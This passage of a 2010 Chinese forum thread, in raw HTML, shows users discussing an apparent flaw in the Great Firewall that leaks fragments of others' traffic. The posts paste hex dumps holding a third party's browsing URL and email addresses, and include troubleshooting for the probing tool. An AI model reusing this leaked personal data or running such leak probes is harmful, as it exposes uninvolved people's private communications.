						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_7" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849822" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849822', '话题链接已经复制到剪贴板')">8楼</strong>
													<em onclick="$('postmessage_849822').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849822').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849822').className='t_smallfont'">小</em>												发表于 2010-9-30 02:37&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_7"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_7"></div><div id="ad_thread4_7"></div>
						
						
																											<div id="postmessage_849822" class="t_msgfont">确实snippet到不少被墙的地址。<br />
<br />
0000014: 3264 ab0c 358d faad 4303 0003 0087 0303&nbsp;&nbsp;2d..5...C.......<br />
0000024: 00f1 0303 0016 045a 0669 466a 2048 5454&nbsp;&nbsp;.......Z.iFj HTT<br />
0000034: 502f 312e 310d 0a41 6363 6570 743a 202a&nbsp;&nbsp;P/1.1..Accept: *<br />
0000044: 2f2a 0d0a 5265 6665 7265 723a 2068 7474&nbsp;&nbsp;/*..Referer: htt<br />
0000054: 703a 2f2f 7777 772e 3933 3934 636c 7562&nbsp;&nbsp;p://www.9394club<br />
0000064: 2e63 6f6d 2f6e 6577 6262 732f 7669 6577&nbsp;&nbsp;.com/newbbs/view<br />
0000074: 7468 7265 6164 2e70 6870 3f74 6964 3d31&nbsp;&nbsp;thread.php?tid=1<br />
0000084: 3436 3334 2665 7874 7261 c00c 0001 0001&nbsp;&nbsp;4634&amp;extra......<br />
0000094: 0000 012c 0004 9f6a 794b&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;...,...jyK</div>

							
							
							
							
															<div id="post_rate_div_849822"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849822_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849822&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849822)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_7"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid849826" summary="pid849826" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo849826" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_8" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849826" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849826', '话题链接已经复制到剪贴板')">9楼</strong>
													<em onclick="$('postmessage_849826').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849826').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849826').className='t_smallfont'">小</em>												发表于 2010-9-30 03:10&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_8"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_8"></div><div id="ad_thread4_8"></div>
						
						
																											<div id="postmessage_849826" class="t_msgfont">邮件也被GFW.<br />
<br />
0000014: bf6f c4ae 7374 6572 4068 626a 7a78 2e63&nbsp;&nbsp;<a href="mailto:.o..ster@hbjzx.c">.o..ster@hbjzx.c</a><br />
0000024: 6f6d 2e63 6e0d 0a54 6f3a 2077 6573 7465&nbsp;&nbsp;om.cn..To: weste<br />
0000034: 726e 756e 696f 6e62 656e 4077 6573 7465&nbsp;&nbsp;rnunionben@weste<br />
0000044: 726e 756e 696f 6e2e 636f 6d0d 0a44 6174&nbsp;&nbsp;rnunion.com..Dat<br />
0000054: 653a 2054 6875 2c20 3330 2053 6570 2032&nbsp;&nbsp;e: Thu, 30 Sep 2<br />
0000064: 3031 3020 3032 3a35 393a 3030 202b 3038&nbsp;&nbsp;010 02:59:00 +08<br />
0000074: 3030 0d0a 4d49 4d45 2d56 6572 7369 6f6e&nbsp;&nbsp;00..MIME-Version<br />
0000084: 3a20 312e 300d 0a43 6f6e c00c 0001 0001&nbsp;&nbsp;: 1.0..Con......</div>

							
							
							
							
															<div id="post_rate_div_849826"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849826_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849826&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849826)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_8"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850342" summary="pid850342" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo850342" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_9" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850342" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850342', '话题链接已经复制到剪贴板')">10楼</strong>
													<em onclick="$('postmessage_850342').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850342').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850342').className='t_smallfont'">小</em>												发表于 2010-9-30 13:19&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_9"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_9"></div><div id="ad_thread4_9"></div>
						
						
																											<div id="postmessage_850342" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>麦圆</i> 于 2010-9-30 03:10 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=849826&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
邮件也被GFW.<br />
<br />
0000014: bf6f c4ae 7374 6572 4068 626a 7a78 2e63&nbsp;&nbsp;<a href="mailto:.o..ster@hbjzx.c">.o..ster@hbjzx.c</a><br />
0000024: 6f6d 2e63 6e0d 0a54 6f3a 2077 6573 7465&nbsp;&nbsp;om.cn..To: weste<br />
0000034: 726e 756e 696f 6e62 656e 4077 6573 7465 ... </blockquote></div>西联汇款啊。汗。。。而且时间戳很一致。</div>

							
							
							
							
															<div id="post_rate_div_850342"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850342_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850342&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850342)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_9"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850352" summary="pid850352" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16455" target="_blank" id="userinfo850352" class="dropmenu" onmouseover="showMenu(this.id)">shiny</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">路过踩一脚</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16455">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16455&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_10" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850352" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850352', '话题链接已经复制到剪贴板')">11楼</strong>
													<em onclick="$('postmessage_850352').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850352').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850352').className='t_smallfont'">小</em>												发表于 2010-9-30 13:25&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16455" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_10"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_10"></div><div id="ad_thread4_10"></div>
						
						
																											<div id="postmessage_850352" class="t_msgfont">哇，牛B了</div>

							
							
							
							
															<div id="post_rate_div_850352"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850352_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=16455" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850352&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850352)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_10"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850376" summary="pid850376" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo850376" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_11" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850376" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850376', '话题链接已经复制到剪贴板')">12楼</strong>
													<em onclick="$('postmessage_850376').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850376').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850376').className='t_smallfont'">小</em>												发表于 2010-9-30 13:45&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_11"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_11"></div><div id="ad_thread4_11"></div>
						
						
																											<div id="postmessage_850376" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>id已被绿坝屏蔽</i> 于 2010-9-30 13:19 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=850342&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
<br />
西联汇款啊。汗。。。而且时间戳很一致。 </blockquote></div>这个漏洞太牛了，做了一个活生生的案例演示给大家看老大哥在偷窥什么。不会是正在利用GFW秘密特殊监视出入境的资金用途吧？</div>

							
							
							
							
															<div id="post_rate_div_850376"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850376_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850376&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850376)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_11"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850384" summary="pid850384" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo850384" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_12" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850384" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850384', '话题链接已经复制到剪贴板')">13楼</strong>
													<em onclick="$('postmessage_850384').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850384').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850384').className='t_smallfont'">小</em>												发表于 2010-9-30 13:50&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_12"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_12"></div><div id="ad_thread4_12"></div>
						
						
																											<div id="postmessage_850384" class="t_msgfont">这段应该是网游升级的：<br />
....yo&quot;,&quot;Data\sound_character.rho.comp&quot;,&quot;1313692646&quot;,&quot;5313536&quot;,&quot;4651637&quot;,&quot;30*</div>

							
							
							
							
															<div id="post_rate_div_850384"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850384_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850384&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850384)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_12"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850494" summary="pid850494" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6873" target="_blank" id="userinfo850494" class="dropmenu" onmouseover="showMenu(this.id)">萧易寒</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6873">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6873&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_13" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850494" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850494', '话题链接已经复制到剪贴板')">14楼</strong>
													<em onclick="$('postmessage_850494').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850494').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850494').className='t_smallfont'">小</em>												发表于 2010-9-30 15:39&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6873" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_13"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_13"></div><div id="ad_thread4_13"></div>
						
						
																											<div id="postmessage_850494" class="t_msgfont">在国外用不了？已经把128.241.91.35换成国内IP了<br />
<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to</div>

							
							
							
							
															<div id="post_rate_div_850494"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850494_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6873" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850494&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850494)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_13"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850564" summary="pid850564" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=9875" target="_blank" id="userinfo850564" class="dropmenu" onmouseover="showMenu(this.id)">和谐牌河蟹</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">和谐社会吃河蟹 @HOY_05</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=9875">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=9875&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_14" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850564" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850564', '话题链接已经复制到剪贴板')">15楼</strong>
													<em onclick="$('postmessage_850564').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850564').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850564').className='t_smallfont'">小</em>												发表于 2010-9-30 16:15&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=9875" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_14"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_14"></div><div id="ad_thread4_14"></div>
						
						
																											<div id="postmessage_850564" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>skyking0752</i> 于 2010-9-29 23:15 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=849650&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
<br />
<br />
师父搞TV，不用注册也可以看无码，利害啊 </blockquote></div>我还以为楼主是你师父呢，原来是个网站的名字</div>

							
							
							
							
															<div id="post_rate_div_850564"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850564_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=9875" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850564&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850564)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_14"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850705" summary="pid850705" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo850705" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_15" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850705" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850705', '话题链接已经复制到剪贴板')">16楼</strong>
													<em onclick="$('postmessage_850705').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850705').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850705').className='t_smallfont'">小</em>												发表于 2010-9-30 17:58&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_15"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_15"></div><div id="ad_thread4_15"></div>
						
						
																											<div id="postmessage_850705" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>萧易寒</i> 于 2010-9-30 15:39 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=850494&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
在国外用不了？已经把128.241.91.35换成国内IP了<br />
<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to<br />
hd: stdin: Illegal seek<br />
no port[s] to connect to </blockquote></div>是你的 hd 指令不支持stdin 的seek嘛，把hd换成xxd看。我这里头还能窥看着呢。</div>

							
							
							
							
															<div id="post_rate_div_850705"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850705_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850705&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850705)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_15"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid850733" summary="pid850733" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo850733" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_16" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum850733" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid850733', '话题链接已经复制到剪贴板')">17楼</strong>
													<em onclick="$('postmessage_850733').className='t_bigfont'">大</em>							<em onclick="$('postmessage_850733').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_850733').className='t_smallfont'">小</em>												发表于 2010-9-30 18:18&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_16"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_16"></div><div id="ad_thread4_16"></div>
						
						
																											<div id="postmessage_850733" class="t_msgfont"><a href="https://math2gold.1984blog.com/2010/09/30/%e7%a0%94%e7%a9%b6%e4%bb%a3%e7%a0%81%e4%bb%85%e4%be%9b%e5%ad%a6%e4%b9%a0%e7%94%a8%e9%80%94/" target="_blank">https://math2gold.1984blog.com/2 ... %e7%94%a8%e9%80%94/</a></div>

							
							
							
							
															<div id="post_rate_div_850733"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo850733_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=850733&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 850733)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_16"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid851049" summary="pid851049" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=8529" target="_blank" id="userinfo851049" class="dropmenu" onmouseover="showMenu(this.id)">shelly</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=8529">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=8529&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_17" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum851049" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid851049', '话题链接已经复制到剪贴板')">18楼</strong>
													<em onclick="$('postmessage_851049').className='t_bigfont'">大</em>							<em onclick="$('postmessage_851049').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_851049').className='t_smallfont'">小</em>												发表于 2010-9-30 22:58&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=8529" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_17"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_17"></div><div id="ad_thread4_17"></div>
						
						
																											<div id="postmessage_851049" class="t_msgfont">请教。。怎样看这些乱七八糟的东西阿？<br />
<br />
<img src="http://i53.tinypic.com/2rfc6xl.png" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></div>

							
							
							
							
															<div id="post_rate_div_851049"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo851049_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=8529" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=851049&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 851049)">回复</a>
